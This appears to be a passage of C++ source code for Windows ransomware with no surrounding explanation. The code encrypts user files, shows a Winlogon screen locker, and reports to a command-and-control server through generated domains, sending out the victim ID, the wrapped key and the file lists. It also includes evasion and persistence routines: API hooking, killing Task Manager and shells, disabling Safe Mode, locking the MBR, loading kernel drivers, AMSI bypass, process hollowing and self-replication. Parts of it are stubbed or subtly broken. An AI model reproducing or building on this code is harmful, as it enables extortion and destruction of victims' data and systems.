            HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                byte mbr[512];
                DWORD br;
                ReadFile(h, mbr, 512, &br, NULL);
                if (mbr[510] != 0x55 || mbr[511] != 0xAA) {
                    lock_mbr();
                }
                CloseHandle(h);
            }
            Sleep(3000);
        }
    }).detach();
    send_to_c2("{\"tamper_protection\":\"started\"}");
}

// Hook NtTerminateProcess
typedef NTSTATUS(WINAPI *pNtTerminateProcess)(HANDLE, NTSTATUS);
pNtTerminateProcess orig_NtTerminateProcess = nullptr;

NTSTATUS WINAPI hooked_NtTerminateProcess(HANDLE hProcess, NTSTATUS status) {
    DWORD pid;
    GetProcessId(hProcess, &pid);
    if (pid == GetCurrentProcessId()) return STATUS_ACCESS_DENIED;
    return orig_NtTerminateProcess(hProcess, status);
}

void hook_api() {
    OBFUSCATE(
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        void* proc = GetProcAddress(ntdll, "NtTerminateProcess");
        BYTE jmp[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
        DWORD oldProtect;
        VirtualProtect(proc, sizeof(jmp), PAGE_EXECUTE_READWRITE, &oldProtect);
        *(DWORD*)(jmp + 1) = (DWORD)hooked_NtTerminateProcess - (DWORD)proc - 5;
        WriteProcessMemory(GetCurrentProcess(), proc, jmp, sizeof(jmp), NULL);
        VirtualProtect(proc, sizeof(jmp), oldProtect, &oldProtect);
        orig_NtTerminateProcess = (pNtTerminateProcess)proc;
        send_to_c2("{\"api_hooked\":\"NtTerminateProcess\"}");
    )
}

// Set critical process
void set_critical_process() {
    OBFUSCATE(
        if (!is_admin()) return;
        typedef NTSTATUS(WINAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            BOOLEAN old;
            RtlSetProcessIsCritical(TRUE, &old, FALSE);
            send_to_c2("{\"critical_process\":\"set\"}");
        }
    )
}

// Anti-memory dump
void anti_memory_dump() {
    OBFUSCATE(
        if (!is_admin()) return;
        HKEY k;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\CrashControl", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
            DWORD v = 0;
            RegSetValueExA(k, "CrashDumpEnabled", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
            RegCloseKey(k);
            send_to_c2("{\"memory_dump\":\"disabled\"}");
        }
    )
}

// Self-defense
void self_defense() {
    thread([]() {
        vector<string> block_list = {"taskmgr.exe", "regedit.exe", "msconfig.exe", "procexp.exe", "processhacker.exe", "taskkill.exe", "cmd.exe", "powershell.exe", "windbg.exe"};
        while (!unlocked) {
            HANDLE ps = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (ps != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe = { sizeof(pe) };
                if (Process32First(ps, &pe)) {
                    do {
                        string pn = pe.szExeFile;
                        transform(pn.begin(), pn.end(), pn.begin(), ::tolower);
                        if (find(block_list.begin(), block_list.end(), pn) != block_list.end()) {
                            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (h) {
                                TerminateProcess(h, 0);
                                CloseHandle(h);
                            }
                        }
                    } while (Process32Next(ps, &pe));
                }
                CloseHandle(ps);
            }
            Sleep(500);
        }
    }).detach();
    send_to_c2("{\"self_defense\":\"started\"}");
}

// Watchdog
void watchdog() {
    thread([]() {
        while (!unlocked) {
            HANDLE ps = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (ps != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe = { sizeof(pe) };
                if (Process32First(ps, &pe)) {
                    bool found = false;
                    do {
                        if (_stricmp(pe.szExeFile, "ransomware.exe") == 0) {
                            found = true;
                            break;
                        }
                    } while (Process32Next(ps, &pe));
                    if (!found) {
                        system("start \"\" \"ransomware.exe\"");
                        send_to_c2("{\"watchdog\":\"restarted_ransomware\"}");
                    }
                    CloseHandle(ps);
                }
            }
            Sleep(1000);
        }
    }).detach();
    send_to_c2("{\"watchdog\":\"started\"}");
}

// Disable Safe Mode and WinPE
void disable_safe_mode_and_winpe() {
    OBFUSCATE(
        if (!is_admin()) return;
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures > nul 2>&1");
        system("bcdedit /set {bootmgr} custom:0x54000001 password > nul 2>&1");
        system("bcdedit /deletevalue {default} safeboot > nul 2>&1");
        system("bcdedit /deletevalue {bootmgr} safeboot > nul 2>&1");
        system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShell /t REG_SZ /d cmd.exe /f > nul 2>&1");
        send_to_c2("{\"safe_mode_winpe\":\"disabled\"}");
    )
}

// Deploy kernel driver
void deploy_kernel_driver() {
    OBFUSCATE(
        if (!is_admin()) return;
        // Simplified driver code (replace with real driver)
        const byte driver_code[] = {
            0x48, 0x89, 0x5C, 0x24, 0x08, // MOV [RSP+8], RBX
            0x48, 0x83, 0xEC, 0x20,       // SUB RSP, 0x20
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, // MOV RAX, [RIP]
            0xC3                          // RET
        };
        string driver_path = string(getenv("SystemRoot")) + "\\System32\\drivers\\s_" + re() + ".sys";
        ofstream driver_file(driver_path, ios::binary);
        if (driver_file.is_open()) {
            driver_file.write((const char*)driver_code, sizeof(driver_code));
            driver_file.close();
            SetFileAttributesA(driver_path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (scManager) {
                SC_HANDLE service = CreateServiceA(scManager, ("s_" + re()).c_str(), NULL, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE, driver_path.c_str(), NULL, NULL, NULL, NULL, NULL);
                if (service) {
                    StartServiceA(service, 0, NULL);
                    CloseServiceHandle(service);
                }
                CloseServiceHandle(scManager);
            }
            send_to_c2("{\"kernel_driver\":\"deployed\"}");
        }
    )
}

// Screen locker with Winlogon desktop
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (p->vkCode == VK_ESCAPE || p->vkCode == VK_MENU || p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_CONTROL) {
            return 1;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MOUSEMOVE)) {
        PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
        static RECT editRect;
        static HWND hwndEdit;
        hwndEdit = FindWindowExA(FindWindowA("LockScreen", NULL), NULL, "EDIT", NULL);
        if (hwndEdit) {
            GetWindowRect(hwndEdit, &editRect);
            if (p->pt.x < editRect.left || p->pt.x > editRect.right || p->pt.y < editRect.top || p->pt.y > editRect.bottom) {
                return 1;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hwndEdit;
    static string input_password;

    switch (msg) {
    case WM_CREATE: {
        HDC hdc = GetDC(hwnd);
        SetBkColor(hdc, RGB(0, 0, 0));
        SetTextColor(hdc, RGB(255, 0, 0));
        HFONT hFont = CreateFontA(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, "Arial");
        SelectObject(hdc, hFont);
        string lock_msg = "System Locked!\n" + decrypt_string(msg);
        RECT rect = { 50, 50, GetSystemMetrics(SM_CXSCREEN) - 50, GetSystemMetrics(SM_CYSCREEN) - 200 };
        DrawTextA(hdc, lock_msg.c_str(), -1, &rect, DT_CENTER | DT_WORDBREAK);
        hwndEdit = CreateWindowA("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL | ES_PASSWORD, GetSystemMetrics(SM_CXSCREEN) / 2 - 150, GetSystemMetrics(SM_CYSCREEN) - 150, 300, 30, hwnd, NULL, GetModuleHandleA(NULL), NULL);
        CreateWindowA("BUTTON", "Unlock", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, GetSystemMetrics(SM_CXSCREEN) / 2 - 50, GetSystemMetrics(SM_CYSCREEN) - 100, 100, 30, hwnd, (HMENU)1, GetModuleHandleA(NULL), NULL);
        RECT editRect;
        GetWindowRect(hwndEdit, &editRect);
        ClipCursor(&editRect);
        ReleaseDC(hwnd, hdc);
        DeleteObject(hFont);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) {
            char buffer[256];
            GetWindowTextA(hwndEdit, buffer, sizeof(buffer));
            input_password = buffer;
            string fetched_key;
            try {
                string domain = generate_c2_domain();
                httplib::SSLClient cli(domain.c_str());
                cli.enable_server_certificate_verification(false);
                auto res = cli.Get(("/api/unlock_key?victim_id=" + victim_id).c_str());
                if (res && res->status == 200) fetched_key = res->body;
            } catch (...) {}
            if (decrypt_string(correct_password) == input_password || fetched_key == input_password) {
                unlocked = true;
                ClipCursor(NULL);
                ifstream i(state_file, ios::binary);
                if (i.is_open()) {
                    string ek(AES::DEFAULT_KEYLENGTH, 0);
                    byte iv[AES::BLOCKSIZE];
                    i.read(ek.data(), ek.size());
                    i.read((char*)iv, sizeof(iv));
                    i.close();
                    SecByteBlock ak((byte*)ek.data(), ek.size());
                    vector<thread> t;
                    SYSTEM_INFO si;
                    GetSystemInfo(&si);
                    unsigned int tc = si.dwNumberOfProcessors * 2;
                    vector<vector<string>> g(tc);
                    vector<string> l = {"APPDATA", "HOMEDRIVE", "HOMEPATH", "LOCALAPPDATA", "ProgramData", "TEMP", "USERPROFILE"};
                    vector<string> d = re(l, {"%USERPROFILE%\\Documents", "%USERPROFILE%\\Desktop", "%USERPROFILE%\\Pictures"});
                    for (size_t i = 0; i < d.size(); ++i) g[i % tc].push_back(d[i]);
                    for (const auto& gr : g) {
                        if (!gr.empty()) t.emplace_back([&gr, &ak, &iv]() { for (const auto& dir : gr) scan_and_decrypt(dir, ".rnsm", ak, iv); });
                    }
                    for (thread& th : t) th.join();
                    DeleteFileA(state_file.c_str());
                    send_to_c2("{\"decryption\":\"completed\"}");
                }
                PostQuitMessage(0);
                send_to_c2("{\"unlock\":\"success\"}");
            } else {
                MessageBoxA(hwnd, "Invalid Password", "Error", MB_OK | MB_ICONERROR);
                send_to_c2("{\"unlock\":\"failed\",\"input\":\"" + input_password + "\"}");
            }
        }
        return 0;
    case WM_DESTROY:
        ClipCursor(NULL);
        PostQuitMessage(0);
        return 0;
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE || wParam == VK_MENU || wParam == VK_LWIN || wParam == VK_RWIN || wParam == VK_CONTROL) {
            return 0;
        }
        break;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

void screen_locker() {
    OBFUSCATE(
        HDESK currentDesktop = GetThreadDesktop(GetCurrentThreadId());
        HDESK winlogonDesktop = OpenDesktopA("Winlogon", 0, FALSE, DESKTOP_CREATEWINDOW | DESKTOP_SWITCHDESKTOP);
        if (!winlogonDesktop) {
            winlogonDesktop = CreateDesktopA("LockScreenDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
        }
        SetThreadDesktop(winlogonDesktop);
        SwitchDesktop(winlogonDesktop);
        WNDCLASSA wc = { 0 };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = GetModuleHandleA(NULL);
        wc.lpszClassName = "LockScreen";
        RegisterClassA(&wc);
        HWND hwnd = CreateWindowA("LockScreen", "System Locked", WS_POPUP | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, wc.hInstance, NULL);
        SetWindowLongA(hwnd, GWL_EXSTYLE, GetWindowLongA(hwnd, GWL_EXSTYLE) | WS_EX_TOPMOST);
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
        HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), 0);
        HHOOK hhkLowLevelMouse = SetWindowsHookExA(WH_MOUSE_LL, LowLevelMouseProc, GetModuleHandleA(NULL), 0);
        thread([]() {
            while (!unlocked) {
                HDESK current = GetThreadDesktop(GetCurrentThreadId());
                if (current != OpenDesktopA("Winlogon", 0, FALSE, DESKTOP_SWITCHDESKTOP)) {
                    SwitchDesktop(OpenDesktopA("Winlogon", 0, FALSE, DESKTOP_SWITCHDESKTOP));
                }
                Sleep(50);
            }
        }).detach();
        MSG msg;
        while (GetMessageA(&msg, NULL, 0, 0) && !unlocked) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        UnhookWindowsHookEx(hhkLowLevelKybd);
        UnhookWindowsHookEx(hhkLowLevelMouse);
        SwitchDesktop(currentDesktop);
        CloseDesktop(winlogonDesktop);
        send_to_c2("{\"screen_locker\":\"exited\"}");
    )
}

// Main
int main() {
    JUNK_CODE
    simulate_packing();
    if (is_analysis_environment() || is_kernel_debugger_present()) {
        send_to_c2("{\"status\":\"analysis_or_debugger_detected\"}");
        return 0;
    }

    victim_id = generate_victim_id();
    string k = generate_secure_key();
    string payment_url = "http://" + generate_c2_domain() + "/pay/" + victim_id;
    msg = encrypt_string(regex_replace(decrypt_string(msg), regex("\\[CID\\]"), decrypt_string(cid)));
    msg = encrypt_string(regex_replace(decrypt_string(msg), regex("\\[VID\\]"), victim_id));
    msg = encrypt_string(regex_replace(decrypt_string(msg), regex("\\[PURL\\]"), payment_url));

    bypass_amsi();
    char e[MAX_PATH];
    GetModuleFileNameA(NULL, e, MAX_PATH);
    process_hollowing("C:\\Windows\\System32\\svchost.exe", e);
    ifstream ifs(e, ios::binary | ios::ate);
    if (ifs.is_open()) {
        size_t size = ifs.tellg();
        string dll_data(size, 0);
        ifs.seekg(0, ios::beg);
        ifs.read(&dll_data[0], size);
        ifs.close();
        reflective_injection(dll_data);
    }

    hook_api();
    set_critical_process();
    anti_memory_dump();
    self_defense();
    self_replicate();
    kernel_persistence();
    multi_stage_payload();
    lock_mbr();
    tamper_protection();
    disable_safe_mode_and_winpe();
    disable_debugger();
    deploy_kernel_driver();

    AutoSeededRandomPool rng;
    RSA::PublicKey pk;
    string public_key = fetch_key();
    StringSource(public_key, true, new PK_EncryptorFilter(rng, RSAES_OAEP_SHA_Encryptor(pk), new StringSink(public_key)));
    
    SecByteBlock ak(AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(ak, ak.size());
    byte iv[AES::BLOCKSIZE];
    rng.GenerateBlock(iv, sizeof(iv));
    string ek;
    RSAES_OAEP_SHA_Encryptor re(pk);
    StringSource(ak, ak.size(), true, new PK_EncryptorFilter(rng, re, new StringSink(ek)));
    
    state_file = get_state_file();
    {
        ofstream o(state_file, ios::binary);
        o.write(ek.data(), ek.size());
        o.write((const char*)iv, sizeof(iv));
        o.close();
        SetFileAttributesA(state_file.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    encrypt_system_files(ak, iv);
    vector<thread> t;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    unsigned int tc = si.dwNumberOfProcessors * 2;
    vector<vector<string>> g(tc);
    vector<string> l = {"APPDATA", "HOMEDRIVE", "HOMEPATH", "LOCALAPPDATA", "ProgramData", "TEMP", "USERPROFILE"};
    vector<string> d = re(l, {"%USERPROFILE%\\Documents", "%USERPROFILE%\\Desktop", "%USERPROFILE%\\Pictures"});
    for (size_t i = 0; i < d.size(); ++i) g[i % tc].push_back(d[i]);
    for (const auto& gr : g) {
        if (!gr.empty()) t.emplace_back([&gr, &ak, &iv]() { for (const auto& dir : gr) scan_and_encrypt(dir, ".rnsm", ak, iv); });
    }
    for (thread& th : t) th.join();

    string c2_data = "{\"id\":\"" + victim_id + "\",\"k\":\"" + base64_encode(ek) + "\",\"f\":" + fls_to_json(fls) + "}";
    send_to_c2(c2_data);
    screen_locker();

    send_to_c2("{\"execution\":\"completed\",\"victim_id\":\"" + victim_id + "\"}");
    return 0;
}

// Helper functions
string fls_to_json(const vector<string>& fls) {
    string json = "[";
    for (size_t i = 0; i < fls.size(); ++i) {
        json += "\"" + fls[i] + "\"";
        if (i < fls.size() - 1) json += ",";
    }
    json += "]";
    return json;
}

string re() {
    static const char c[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    random_device rd;
    mt19937 g(rd());
    string e = ".";
    for (int i = 0; i < 5; ++i) e += c[g() % (sizeof(c) - 1)];
    return e;
}

bool is_admin() {
    JUNK_CODE
    BOOL admin;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID sid;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)) {
        CheckTokenMembership(NULL, sid, &admin);
        FreeSid(sid);
    }
    return admin;
}

string get_state_file() {
    vector<string> dirs = {getenv("LOCALAPPDATA"), getenv("APPDATA"), getenv("TEMP"), "C:\\Windows\\Temp"};
    string fn = "sd_" + re().substr(1) + ".dat";
    for (const auto& d : dirs) {
        if (d.empty()) continue;
        string p = d + "\\" + fn;
        HANDLE f = CreateFileA(p.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            CloseHandle(f);
            return p;
        }
    }
    return fn;
}

string generate_secure_key() {
    AutoSeededRandomPool rng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(key, key.size());
    return string((char*)key.data(), key.size());
}

// Self-replicate
void self_replicate() {
    OBFUSCATE(
        char e[MAX_PATH];
        GetModuleFileNameA(NULL, e, MAX_PATH);
        string op = e;
        vector<string> dirs = {
            string(getenv("APPDATA")) + "\\Microsoft\\Windows",
            getenv("TEMP"),
            string(getenv("ProgramData")) + "\\Microsoft",
            string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        };
        for (const auto& dir : dirs) {
            CreateDirectoryA(dir.c_str(), NULL);
            string copy_path = dir + "\\s_" + re() + ".exe";
            CopyFileA(op.c_str(), copy_path.c_str(), FALSE);
            SetFileAttributesA(copy_path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
        send_to_c2("{\"replication\":\"completed\"}");
    )
}

// Kernel persistence (BYOVD-like)
void kernel_persistence() {
    OBFUSCATE(
        if (!is_admin()) return;
        char e[MAX_PATH];
        GetModuleFileNameA(NULL, e, MAX_PATH);
        string driver_path = string(getenv("SystemRoot")) + "\\System32\\drivers\\s_" + re() + ".sys";
        CopyFileA(e, driver_path.c_str(), FALSE);
        SetFileAttributesA(driver_path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        HKEY k;
        string svc = "SYSTEM\\CurrentControlSet\\Services\\s_" + re();
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, svc.c_str(), 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
            RegSetValueExA(k, "ImagePath", 0, REG_EXPAND_SZ, (BYTE*)driver_path.c_str(), driver_path.size() + 1);
            DWORD t = 1;
            RegSetValueExA(k, "Type", 0, REG_DWORD, (BYTE*)&t, sizeof(t));
            RegSetValueExA(k, "Start", 0, REG_DWORD, (BYTE*)&t, sizeof(t));
            RegCloseKey(k);
        }
        typedef NTSTATUS(WINAPI *pNtLoadDriver)(PUNICODE_STRING);
        pNtLoadDriver NtLoadDriver = (pNtLoadDriver)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
        if (NtLoadDriver) {
            UNICODE_STRING us;
            wstring dp(driver_path.begin(), driver_path.end());
            RtlInitUnicodeString(&us, dp.c_str());
            NtLoadDriver(&us);
        }
        send_to_c2("{\"kernel_persistence\":\"established\"}");
    )
}

void multi_stage_payload() {
    OBFUSCATE(
        char e[MAX_PATH];
        GetModuleFileNameA(NULL, e, MAX_PATH);
        string stage2 = string(getenv("APPDATA")) + "\\s_" + re() + ".exe";
        CopyFileA(e, stage2.c_str(), FALSE);
        SetFileAttributesA(stage2.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        system(("start \"\" \"" + stage2 + "\"").c_str());
        send_to_c2("{\"multi_stage\":\"deployed\"}");
    )
}